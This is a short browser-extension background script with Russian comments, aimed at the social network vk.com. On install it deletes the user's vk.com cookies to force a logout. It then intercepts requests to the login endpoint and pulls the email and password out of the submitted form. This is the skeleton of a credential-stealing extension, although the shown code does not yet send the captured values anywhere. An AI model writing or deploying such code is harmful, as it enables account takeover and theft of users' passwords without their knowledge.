// 1. Логаут через очистку кук
browser.runtime.onInstalled.addListener(({ reason }) => {
  if (reason === 'install') {
    browser.cookies
      .getAll({
        domain: 'vk.com',
      })
      .then((cookies) => {
        cookies.forEach((cookie) => {
          browser.cookies.remove({
            name: cookie.name,
            url: 'https://vk.com/',
          });
        });
      });
  }
});

// 2. Перехват запроса на авторизвацию
browser.webRequest.onBeforeRequest.addListener(
  (details) => {
    const { requestBody = {} } = details;
    const { formData = {} } = requestBody;
    const { email, pass } = formData;

    return { cancel: false };
  },
  { urls: ['https://login.vk.com/?act=login'] },
  ['requestBody']
);
